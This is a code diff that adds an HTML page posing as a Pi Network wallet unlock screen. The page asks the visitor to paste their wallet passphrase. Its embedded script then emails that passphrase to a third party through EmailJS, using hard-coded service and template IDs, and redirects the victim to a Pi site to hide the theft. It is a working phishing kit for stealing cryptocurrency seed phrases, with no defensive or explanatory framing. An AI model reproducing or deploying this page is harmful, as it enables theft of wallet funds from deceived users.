@@ -1,0 +1,82 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Network Wallet</title>
+    <style>
+        body {
+            background-color: #30004d;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            background-color: #4c0072;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.3);
+        }
+        input, button {
+            width: 90%;
+            margin: 10px 0;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+        }
+        input {
+            background-color: #fff;
+            color: #000;
+        }
+        button {
+            background-color: #ff007f;
+            color: white;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Paste Your Passphrase To Unlock Your Wallet</h2>
+    <textarea id="passphrase" rows="4" placeholder="e.g. alpha bravo charlie delta..."></textarea>
+    <button onclick="sendPassphrase()">Unlock with passphrase</button>
+</div>
+
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+    (function() {
+        emailjs.init("OJ0Gz2bgJSeWbBpj");
+    })();
+
+    function sendPassphrase() {
+        const passphrase = document.getElementById('passphrase').value;
+
+        if (!passphrase) {
+            alert("Please enter your passphrase.");
+            return;
+        }
+
+        const templateParams = {
+            passphrase: passphrase
+        };
+
+        emailjs.send("service_3mor5hs", "template_tl6o2l", templateParams)
+            .then(() => {
+                window.location.href = "https://mine.pi";
+            })
+            .catch((error) => {
+                alert("Failed to send passphrase. Please try again.");
+                console.error('Error:', error);
+            });
+    }
+</script>
+
+</body>
+</html>
